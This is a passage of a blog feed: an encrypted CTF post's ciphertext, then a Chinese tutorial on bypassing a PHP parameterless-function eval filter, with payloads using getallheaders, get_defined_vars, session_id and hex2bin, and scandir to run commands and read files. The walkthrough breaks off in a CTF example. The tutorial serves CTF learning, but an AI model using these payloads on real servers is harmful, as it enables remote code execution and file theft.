e53fb603d5c5eab1e95992dd32056284f5206e8a72df2dccdaa835579b01a8f7f59ab4e515cdcfa9f2df0a3de29ece89688dd1c23e68c26665da0a3a425e67e77cbc99eed8b3833a707151dfb2c454cdaceb563c67a8f8556e11702bb242c5edc7cdd21d6bbf1e8bf13e809fa274bc8acf1c5dead46b079f8d7158053d18ea168c1ec34364ec68268715a2a2bdd686d6a4ba2c3476abbd8bc3ddca14970beeac74a96ca997e53e77556e63dcf7e687b232bb17a6f1c82673df034e9a9a6658aee76d716ca90755a881915597ce25bf967b8fb031a457326ef613a1da3cd5b82ac328c4f966032202b76ed69b48ce5035dc295ac8e0396ac14d0c38ebf6325e94d7f57927807e9634eb378db7f6e5df44862a65b71dfb00c523bdabfdbe6d4719f77dec090f544190406cd5a196f7eaec621d99a08972f75a21d1783e0a322cb909512b91735b731d13ff28f2582a69085206f4f64102aaafc3bfe4d8ee17fc001570f3e4e22ab076f57082a2a0b46ebc1cbb3b20d73aa69338359b13d1df6e91b0e25f73c2e50ae893c14077cbba0a6dc0676eb6998123950397eb9099d4cd04a65c92a32ba83d6fe35d07333e99085df3135b8d592df0d6a02a0a4100ee6664febc159fa8eb445a00391548b98024e942c1efe84cfc82b207f3f228d8f02cac1d2d5de46396b762bc188994279f64b1ec52f54490b3e2d92ea5bd2334b2beb76dc305a70a2a6c0df5e7fc61a3eb3fbc3d51a5f05906d5096aacb3b20a44965dc5866a959834708f929b85c6cad9704ff7864b9cbf518310aa3b4bae2217be6a7572e23379b29e317aa92b3be7f159f94ed856f9108fffd598613262e07b1f40248f0f8e9b4872737a73dcdaf594ff57e2e9e29cdd8da3b4982272f2d145a6c8f5f28bbc9525d65027bb259945a315bd9ef88985b17175b7e42b0b68ce634b3b06ed600ed7b83534d4b98d235a25b88b5c2015fbee9960697801c00c652d22b3d8ff243a3b754e87d9802487192688fef4217c32ad31f914ad607372bb7d6473070fdb9c26d2279ac9cbcd47349d8bdf01b1651171e378496c4db978c354e55076b3de757678fb6c8ebfa10e3583c13310d84ed979d533c1a2a863a4e2081b01e298d84154f2cc83c12aef5a2cf86c480958f7a92ba93c174c1a79160319a8acbe87c400934afae7dbb3314b64ff3c035a9eddb320d9e05818dd076f21b749745b3c8cc8a750f4e2056ff822900f047180d7d23bba43e777fa7e65a4642b1946cb63a406a5b8d66cd9d0ab5e08a276f500b7ca30f0e119aba355efd142c66ecc9a3afb27e35e655d69b469f61149f00a091e972ef86338a1b7ce021421401956c504c6dfd263ed6a80de011e8e291b33c891d90c4d6a2a45a80082900914a4be40a709ecf4ef7e1573afd6a212a7b6aadca207af96c316f3262f87d0f0198bc5d216c5e9c0258877319d9806616e050bdbd39ad47c1d335627c426512462d7181cd8c65243eb91b5f26d91add29174f5d4bcf643ac25b3906ceb45e4d1b0895defd73369a6d99231394348de0f13721399725c433e8ebc79675e7e524fab4b28d418eea023895d2d33130121b5b301a38e17c0ba671023d8a88254407e5534cf2c8ea4dd14027c5ac3c828e5f9e8fe571a94b19633281ab3da22a0e8d27d4aa9af40e93e9183a7e8b782ab10fee9a59107172062ed9b52de520922a159644a311c30ccf452416dd36314cf4a81cdce6c07946bcd35b18e2e6308960ec6cf5c0e1f1adcbe18542b2e4d62db07f750c4f7e5c246d689a1630edcae96b9ed4d244b784dac41a0c89236ab676052821893500211a9401e3854ef9b68ed74d654de05ba01c5f4fc51a17e084f85e99e124cd3b89f6457d785949ff0c41ef3ebcca1fdff0f2db643311eb97ec19dbaaf78665083043d3a5ed96d3a1d6269a36e436fe50cfa355a9cc9ee5d02e769c0494137affcdbd0a476f1286b4c15c3c49768b2ae62bd2138bca74a0eab7ac31c08b4d9be34d328584d32f349064129b085ea9d6c266a1f5d3615094b98399f2b4d590dbf12f79b9a3c5a74b5f185454a6f207779fa6bfb207d25c767a9bc741ed60637a8d2a80e56cda10aef2132ed44bc77c663f0dc15efe1151fbb1e2496f00c68dfa504e1377cfe5972bbc4ecfeceb3cd563f2e698ad7fcd14f4c6c7a55f50c692aa0eb78ad3ee3ea4647b172c5fda5cb265a0a592782c913e7d36cc14437483124baed65f746a0b6a51dda45029c5e1e935e8b9001d9100704a301045281c9f52d7c774d153c9cd5694b1cd9e458f302037ab01bee0c46018d0fa5f3ce51cfe4e056b0b9caaca3ec5e1b8d3abacec1615dd5e6e391032b570f7261f6ded1df3358c439c8cb9e47d87d6981c4aa9b8a6e6be7dc596578b2417a0081a5be636934214be6b78ff911a2749814e4e9fdb66ecd42af6d596b47e37871e289bc68f210d2bf00f0b56554d2ebfa739312a11c472075a38bcf40a3842033d323be46eed49dbd7eaa0e5e3a5d2ab953d62b6e0174126b54fd6d707cbefcd202e7f5f74713f7a72f38b21e992e99d5389e15ddbf1eba78e0cb73fb17812774c6d37db7cca2cedb97df9959ab873836b4da50acd34e8d1833220899403ab5744f006abcbba382ceb8d09290c083d2186bebe4f6361c2c638d4a52c8ed586b7f76aa1a0cc6ce19ab04c19007b6ff74e80da0857a5954c91b09c1b687891324adccee07473ab5348e2c5d561eb4ecb709ec4f9d786b462b518fa0e63530c0a2145fb673649b3ee3bc5d6ea4dcc962d7d456ab537cd68daead001d17de120d9a6d80a7ba21dcfe3cdca667f4c65c2b45315431e7e41db8f9387b275be1ea67a967f60ea7f1ec30972bc92da043e11c7d2e56b45e0043b16d2ef1dd0f6c729c479fe2fc7c1406e854abfe763ab5e672c6fd8b9485bc614d97b26df20bd98c2e35324f76048f9341aa05671b28b8392d80f825289e429a39f6c703f72f9945631daf16238abc3d7615d804f5a725ba55b6f4569c88b86c6d54bd274ec242a5dfdee21c2c8d6857e14aed55539a8c5bb001e54965e397abecb79b517c3f49f3854d5af8cc829c4b168a5a009ac071dc912a2cb4a08c13cee4cbf3c78a665897a85e33453ec1647a9895b6b798e59598efe8a8c52d9ad993cf082f189fe367ef5dc033d5b0a3480c22b201c7cb93c81595b6b0859a9dd88010ed6aba31600db40743bef3f190e0d946f95a1110d28a0104d157f867b4b4d9174bbcb555067b6ef008bfc5d4f4c25755de17c74de3272a0df83491c4b952fdb5dae07c103e96157b66f93cf0b278fcc52ef5abb1fc697f9bb48c408e0d18c4f815722c375464fedbbd6cf5fb3a97e8ad0561ec6eeec5eb2e3a77cb75c5261d7e00712caef5440fd86cec333a052b5fad2c55a0114739760613dc6d0ed4cf50d6db866e87116c29d1c61cf1cad705f03c30cc58eed9c0054a3f646862f4d30c671d99a411dab8b8a991974775cfb3d49f0bb03ead66350fd8aa586588d79bd128be74f5c9dcb29473f6fdcc340cb3bfef28c207d43fa5102d90482d768d7b4cf8896b8dd49a7fa6f7984c1d0196cfea95e09c9058d75af9ce1ce16bb39dcf3ede4d6ab644128e4368ac2d44f3e4ab00896e817f1627c496c95ad2f7b6bfdb82181bd988f00a9d3eea765546767b6b935ffd1dd1917697453c525a18025f9179ec12a037f7211dcc595befbb7af5f35135f63ad100c20dca51780ff64e59485f8ea18f4573b5cd3639c9d9b8cd98a4589c33ce31e4df8ecd85944868bd3872474cf61411c6cab220a06db7962ce8ff6c8cd8d4a74d68354509f1e011441f239ae8f31f7d25d6fae45c8509e50699ef1ec315b96cb83c720e105ceeb309aaca2e90f7441da3476b72183fb8318380c79b5a665bbf232138db950833df492b039d52450cbaf1d629285b5a9c8e96961b438e77c900b21c1581267563b8b5a5d1db44dd392e82b190585cc8fec0c9f8f5489468e1b56cff454ede5cf74084b91012ef6b2d925e542133430d6ab29406978248ce9ad0ee8ed082e78230f23a81382f4f824d2acd3dc3451abf1baba139e2b6c75f44bd86f71ec232b5071d1d4cd220c74294a42427e574b3d5cebab85c782cc79a47561d85bc1fd1c7d3b19b1cf505639efec8ae76466b16c60bfda7209091d9951abc017d924b21bca51086e1fbac5f0cad3b761aabb730c8e04de712299e45053606c089393220f4a7d9b55870fd33b156130bd0859656b9022ffa44f3fee387406bf72393c3a1a434c6a4c9d9d3b6ebb4175fcadb2bb03221ccef97df827b308edae84023abf20608f6b21c6bb25c3138bd697d5957a96ccc70a78e055011ea1fb1d92f7302c605a9dbe3c854a849c8ba99dd1191f7b92270019cd3633be6f9152215ac91f1aec712e14c24b5bc7bd63dd165d44133d5c59a6369592bc4c0a84a2cb0b0da85d387a11543dbf98fd89a9b29b798501f3acbf1c63698bed33980e6cf609e603b2dadc962c5f6044730ea2279b797f486378c5dc636b342062840f945da8d1469107fc3b71427da39bdfb3b85a6434ae33a39baf31e8bc339a82eeedb5018f4d976cb2db8e6e74dfa842e4a49c13684ad9f5c04fc4b6c90760d83e651388e0a0b83ee0a73d9cd5d747025a78b0564e52d19dc3153413bab9f19b46e39b5b6dac1606d26eb198dd3b7299d83e918d695590cdbdd70d541e5cad669a6cc773005fae532746c9e664b06a6c284a5bf64a02e8997a4b035697e7dad8292a56ff85d13fddbb3376c5abf0d9eb3672d21dedfe4aa071e619fa5b6466d7927be0de796df29db1b173a1e85c9e9c129977ac71e5afb05dfc0171d754c8f233929241a3abd62bdb0e65253db1da2e90acc56f2d24a71678f3c2caa88ba93b0d892712baab5ff0569fe3a2b177fdd7c4ee561b16ace24f30dbfd4a6a164010e56465112415a67ea759ecf47139f58662453342abe75660f3b9578a00f97bb09708555ad4799ccc1a6779b5df74cfc5fd8a25cde878449851028ce8e2510754a00bf037f03db754fcf32e5ce8368a91dca8a020cdc5c906c63f23f4efefec13bd0351f7467a80c7c11b3db1e648ec6c06152c01f02606f6cf041269fdbbe9a41fc87abe1fb9cdff24689ef80c1473e592ba326b18ff9f23881c0d5fd7f8d802d54ce275555d47d62793b96a6ff3be1845395eb1e3d14b7b355fe1b750d85059cc266db25edabb4aec6b6ee91bdff63702f31dfb6271917a41f25c4537ddba67dfed89d889d85ad75f24b62aa826fe7756e654ebe5c84623bc9cb0dbc6446d85ffd2f2b03d6ed28be0f817f2be59c1ddd823bcf6ca064b29d37041ffeaa242aa510fd347d9a430eca402a47c70213742c80795488a670d0abef4b8db2946330a44e0481c75cb953bc9797c5cc2d6ef777c2bfbf953939509aca6d34b1fb441e3e20f3334ddfb9bc2d271bd0f90f430754670c802bfd218d1990a013154f8a95824e83009337c450595fadcd8aa46729dd089fee7cf715136cdffe2c14d6489194d7244241cfe1498dee5a2c14b0597875a003eaab13fa661761d5a69f16e0582a0f8dec84b228c41a6a41509b9c05460a6a612dd83a4033ff5fb24c9f7b44edb9b4e3fb41d8457462508597549615d468dd9e700ff94d39b582e73ce8db0762d10ef0c4a778254e1bf1f5415f3b7234d8386ac0ac2282447f92228801ab32c50ea30fded9e5fa36c54b290d2b66134720797144340283d0bf8259141dca0fbc2c645c89fc703cd221ceaef449633a96607280a362527f0c69185781e1ec77519612e3c221fa7c70fe696fbd565051e1ce2d40356b03ec44759a6f6fbf09028bc192e2dcacb4ae642f2c6f5e0b0b08d8cc645ab91b0c7dcef13ae10b3e1e10085603e348b89730c5246f9f6062796bd2ea6fffd637cdb37e84b8fce8f42aeea61cef0aa1a093eec12a76c3e8b29fcf26de403019f1221d8c9716f756dbebf9cd718dcd85077995a52259435f82ed05117dc4f24668814fc46d81764b23dc6e4b8909be3fdf4a512a4a6e31c4e76cb710af7a2fe45e8991a3478e73db219773c7c72096fbf20aaddbba21a47e4d3ac3194d08ff099ad40952b69356e720e006d4e697edc3ce74a153d4271c63d5d6b543577e844a47b1f98747236362b74f260a4c1f1d0ca6dd22567b767f3f73861882283d7b2ae3fb7b12951dfd47dc02cfba7b17da8e1774d95c66061e34ffb787763463c463d13995e8b6940baef66bd01c860c895ba245a3255191fb4b175c1779c51c684660b454729006a5ce29debd9850abbb1855167fe00c5c84eeeefcf874edfd510e54b3b28e29b0b56fc4ce4dffd45b233a1d6543604397d56f35cdf164040896416af95410d6c877ccec0bbe57ac53e2d5e59e4d345c9ab93cc34b4ffe8fb1691c273e33c913bfbc3b9bdc1ec32d36f7e28fcd9ec23c3dadafb3d9b562453396199d6307cce6febad73110a8d9393dad5e7a5beca6173636e75b17aa79daf5b1a8f4357af922a69a4857c1974ce2b76b047821969a9c4c5be2ebb333bedb06d951eef29b103377fb15853d95d014c5ca60322d5ffb26bb76ad075a935febeaac588bbde32431c98557ce1d5006fc9f9e765cca52c72472096963945026e4ddb3755fd66c6bcd1d4e327b91c804e54579ef9930e143914e1369348628ea32d868e5f662188ed0ec6d2b05d8862a0ed2e0d36fb53c325cf678444b0d710d9aecee1e1b6154b2ddaab2e394c334bb4d167493e2d7c9fbbceab230357c17a04eb8a2260c1af28945c2ded5b67df503cb36aa964865f2a42e8462ba426bd744d55a511ef5cd3a46a856d0fe375b186b93406c36e62192eaa646627ddb8aff7a30d8259b7069fdcc45577e2e4758af805aaf62342ddd70f05c98b624c1ff09447e9b1b47af6d3162c3af3be2c782b6280c4c4406b3ee0e46b045e97eaaa82453072c916355d240df7afe0899a0c843f508d7c7ba695b88ee124a6505fd9976e04288d654926a6829bc65482dd5a9f897d43b873fc4f0fcddd660d150f97ed0874e6c896fe8c83ae27d27753da6c340d4af45ff227e06c0981e75c2a4d9c71822813d878f4a3529225da0588e4df77b5ba909d56ff316b9d8028b038cb7a99668d2d97512b85119c2cba9d350f4a4787198fa8fd0695d50e913ec7170fc344fb6a324e7e8a8d6a2eed286df1451eb1bf6c1b245fd1b71592139b0b225fd703bc952d79daa95b9dfc7d61b0f2edd757c3b64ecbfbf5056edd2547782660b3292d5dfcb65f6f921e9aea080a45c400505fdf7378ad420c79a5c657c063c694b71a1678f78d1ed361fbc7a3d157b132264d2a17576cb8fc7c6597e7688c870b2498362adefb65ef9037a4f31e44c07174e624954f99fb8464db7a2f2319977e60f217dffa8b453646e433bdf7879bf666e0623820f5e8ef01e81ca14e2bda8cb55a8553d70f03cf865a7b026724716b943f077b508016b37878f7d8e4cf5b25dfad06f219223fa6a1d2cd9ef3900245dc168a3601a6fcde3bbdf34fae75f883ca9841881aa56f87fabc451642a4775d62adb47e88188f0226d2102899637fce299594f401586c4d0c2b63178fe78b39160cfa30342863d96c85e7a7b84be0757aac6b107d7ef19a6c40d1e87b27f46734acdac3aa40dbb10bf50ae63e4a992fb64929ab2277d8d6e18c52d4aaa8a930589e30e9b39498dede04a12b8c75921c5f31ddf02f5d4b611bd591f9292714c8eb683d5fa656a5602135a9d21cea177bb76b3c604670c9818249d92036b4572d13b6ed069a2cc6f2c1d093a112cda2950247d838f9f08220f5f42f1ecb7d2ab7c0b087c460334cdd77bf8226483cebcff03e837e87b290250d807691948fd838c891720025fb90deb375dea625e3c88e7f9278ad7aaf1a81cb89cc47ffdab88a1c326b93b6f0df9f087340fe8ee6d7f4efa9311eb86c345bc972c26b6d03f1cebafd47c4aea3d612e9658940a96f2e0370af498d6d1071248e3f4f5fcdaca49d168b487f67a7eb97519453d2b1345b48f9962880dd7ac9874fcef1c144c66520e69c403b7919dbf29a92ba1add7cac8cf18e08e4cb159d6ee6773590f982706c2a874c87e224bf5266216242dc70647dd1b1444aeaefce9c064f5b2b3cd4bf89e0cddf48e3ec7a4477299f7904bec1ad5b1a4dd0bc0505ded926d2bf5bb8b8b211cbee75c31d1e4f30bd4c75b809adb20df3839ede1870e1df5fe0ad960e2f8f50ff81ef813b43db67858ae82b7f8c7b862fa0dea656afe747f99e1aa33335b1154b3d3c5ae6c7c2977c19a1ca23061b3f6d58a7c9d1447c08a2bf61c805736285d64127321bed70fb3cb068235fa507e9b2f66f1213782981180a6419df7e0772dded20a12928ced038cab6c32822f0387dedf118a2efacc797e1490cb3158d18db98bfc0ff34d503a71f21dbcd8cce32350a5b1a3420b46e8cb06dfab02d00043793073e4e4c1b41b866cd2eb1ea1930785bd956f8c3f17ba657618ebb0b55b7ce079cfeed286ef284153fa9a2d9573b84153a7beeff5dabe4197879ae6b384d4ca420c7c7baf38caa8a574eefca7caba10674f692313108fcc1cc75c15772b2af8e302a2395fc5fb144957c66ddfee5962e90069d9e5ab664e364178dd9ebd48c56a5c0e8300ece89f7e8942d64d349ebd2d256d85895bfd7ccec0e5b3a92b505d09a69e4e3b68af0fe3f4c64d4868eed07319481fd3e66f7838af252d4c2be742c9311a19e861b943d8a958dd8b8b7d330d1f7e87d88ad145550908e7ad39fa877a06988f7896b26c7495ff4e8e8c2df995db8d1b573a2f4845dc3e7670fc953126577e830680529c7699099c993ef5e9c830ab94ab40ebf210af0467979c527e4169922afbfb3658781b69e2bd03909273bf42eb97b35eaf46e5712c6bfb8dca889bfbc5a9150279dfa3449254854d24f057010fdf6d6e5b40832fca929ab000333354cc354c96e09780d9541509c6f3d25ff849e7999715f72249ab6980b476e3fc45f93175cc368abdc24af68a604eb577a3a76eaa24b4258f07a38e0bacb96f418ade7da128e98cee6840567db80462b9821eb699651683c7b53afcac8862675d91eb952f1e834f152aa8206eedb1262ac6cf016dc3e506c67a7daf194f2b785da7b927b4f477c81c681dfedd187c831622ebe98668a03728dc70edccadd87a62f6f6e4d90</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>无参数rec</title>
    <link href="https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
    <id>https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/</id>
    <published>2022-04-10T06:32:10.000Z</published>
    <updated>2022-04-10T17:33:42.106Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code class="php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>这里使用preg<em>replace替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9</em>]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;<br>以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><pre><code class="php">目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。array_reverse() 函数返回翻转顺序的数组。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件    编码chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。</code></pre><h1 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h1><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>**getenv():**获取环境变量的值(在PHP7.1之后可以不给予参数)</p><p>适用于：php7以上的版本</p><p>php7.0以下版本返回bool(false)</p><pre><code>?code=var_dump(getenv());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235047746.png" alt="image-20220410235047746"></p><p>php7.0以上版本</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235228226.png" alt="image-20220410235228226"></p><p>还可以通过这个打开phpinfo()页面</p><pre><code>?code=var_dump(getenv(phpinfo()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235551070.png" alt="image-20220410235551070"></p><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>**getallheaders:**获取所有 HTTP 请求标头，是apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用</p><pre><code>?code=print_r(getallheaders());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235935581.png" alt="image-20220410235935581"></p><p><strong>payload1</strong></p><pre><code>?code=eval(reset(getallheaders()));# post中增加请求头flag: system(&#39;whoami&#39;);</code></pre><p>在我的burp中经过测试，设置的请求头跑到了最前面，这个问题我也很奇怪，网上流传的是取最后一个头，那我这里就取第一个吧。</p><p>测试一下，在这里添加请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000647293.png" alt="image-20220411000647293"></p><p>输出一下第一个请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000715021.png" alt="image-20220411000715021"></p><p>我们发现我们构造的请求头在最开始，那么我们就可以构造出payload。其实在开头还是结尾，问题都不大，灵活变通即可。</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001023643.png" alt="image-20220411001023643"></p><p><strong>payload2</strong></p><p>在php7以上的版本使用</p><pre><code>?code=eval(end(apache_request_headers()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001253812.png" alt="image-20220411001253812"></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p><strong>get_defined_vars():</strong></p><pre><code>返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;files</code></pre><p><strong>current:</strong></p><pre><code>返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值</code></pre><p><strong>payload1</strong></p><pre><code>?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001923627.png" alt="image-20220411001923627"></p><p><strong>payload2</strong></p><pre><code>?flag=system(&#39;whoami&#39;);&amp;code=eval(reset(current(get_defined_vars())));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002114740.png" alt="image-20220411002114740"></p><p><strong>payload3</strong></p><pre><code>?flag=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></pre><p><strong>pos函数:</strong></p><pre><code>pos()是PHP中的内置函数，用于返回内部指针当前指向的数组中元素的值。返回值后，pos()函数不会递增或递减内部指针。</code></pre><p>解释下这个payload</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002640375.png" alt="image-20220411002640375"></p><p>我们发现flag的值是被嵌套在两个数组中，因此如果要取出flag的值，要执行两次pos</p><p>第一次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002803950.png" alt="image-20220411002803950"></p><p>第二次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002837861.png" alt="image-20220411002837861"></p><p>成功取出，加上eval函数就可以执行了</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002921084.png" alt="image-20220411002921084"></p><p><strong>payload4</strong></p><pre><code class="python">import requestsfiles = &#123;   &quot;system(&#39;whoami&#39;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</code></pre><p><code>而如果网站对$_GET,$_POST,$_COOKIE都做的过滤， 那我们只能从$_FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名</code></p><h2 id="session-start-函数"><a href="#session-start-函数" class="headerlink" title="session_start()函数"></a>session_start()函数</h2><p>适用于：php7以下的版本</p><p><strong>session_start()</strong></p><pre><code>启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()</code></pre><p><strong>session_id()</strong></p><pre><code>获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）</code></pre><p>可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</p><p>但其有限制：</p><p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p><p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p><p><strong>hex2bin()</strong></p><pre><code>转换16进制字符串为二进制字符串</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>payload</p><pre><code>?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1Cookie: PHPSESSID=73797374656d282777686f616d6927293b  # system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411010515707.png" alt="image-20220411010515707"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code> show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))); highlight_file(session_id(session_start())); readfile(session_id(session_start())); 然后抓包传入Cookie: PHPSESSID=(想读的文件)即可</code></pre><p>payload</p><pre><code>GET /1.php?code=show_source(session_id(session_start())); HTTP/1.1Cookie: PHPSESSID=/flag</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/20220109194247-442d62d6-7141-1.png" alt="img"></p><p>这种方法我并没有测试成功，先写下来吧。</p><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h2><p><strong>查看当前目录文件名</strong></p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011259622.png" alt="image-20220411011259622"></p><p>文件读取</p><p><strong>读取当前目录文件</strong></p><pre><code>当前目录倒数第一位文件：show_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));当前目录倒数第二位文件：show_source(next(array_reverse(scandir(getcwd()))));随机返回当前目录文件：highlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011558669.png" alt="image-20220411011558669"></p><p>多试几次</p><p><strong>查看上一级目录文件名</strong></p><pre><code>print_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011321325.png" alt="image-20220411011321325"></p><p>函数解释</p><pre><code>array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。array_flip()和array_rand()配合使用可随机返回当前目录下的文件名dirname(chdir(dirname()))配合切换文件路径</code></pre><p><strong>查看和读取根目录文件</strong></p><p>所获得的字符串第一位有几率是/，需要多试几次</p><pre><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011343731.png" alt="image-20220411011343731"></p><h1 id="ctf题目讲解"><a href="#ctf题目讲解" class="headerlink" title="ctf题目讲解"></a>ctf题目讲解</h1><h2 id="NoRce"><a href="#NoRce" class="headerlink" title="NoRce"></a>NoRce</h2><p>源码：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$exp = $_GET[&#39;exp&#39;];//php7.3 + Apacheif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)) &#123;    if(!preg_match(&quot;/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i&quot;, $exp))&#123;        eval($exp);    &#125;else&#123;        exit(&#39;NoNoNo,U R Hacker~&#39;);    &#125;&#125;else&#123;    exit(&quot;What&#39;s this?&quot;);&#125;?&gt;</code></pre><p>过滤相当严格</p><p>测试一下，发现</p><pre><code>apache_request_headers();</code></pre><p>没有被过滤</p><p>我们还可以利用其它几个没有被过滤的函数构造payload</p><pre><code>die() 函数输出一条消息，并退出当前脚本array_shift() - 